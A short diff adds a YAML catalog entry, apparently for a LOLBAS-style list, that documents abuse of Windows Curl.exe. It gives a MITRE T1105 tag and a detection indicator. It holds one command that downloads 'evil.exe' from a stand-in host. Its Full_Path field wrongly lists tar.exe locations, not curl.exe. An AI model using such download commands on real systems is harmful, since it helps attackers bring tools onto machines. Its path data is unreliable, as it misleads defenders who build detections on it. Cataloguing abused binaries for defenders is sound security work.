@@ -1,0 +1,23 @@
+---
+Name: Curl.exe
+Description: Used by Windows to transfer data to and from a server.
+Author: Brian Lucero
+Created: 2025-04-29
+Commands:
+  - Command: curl https://example.com/evil.exe -o ./evil.exe
+    Description: Download files from external sources
+    Usecase: Download files from external sources
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\tar.exe
+  - Path: C:\Windows\SysWOW64\tar.exe
+Detection:
+  - IOC: Curl.exe downloading files from a remote location
+Resources:
+  - Link: https://x.com/Cyber_Sorcery/status/1917265997095911866
+Acknowledgement:
+  - Person: Brian Lucero
+    Handle: '@Cyber_Sorcery'
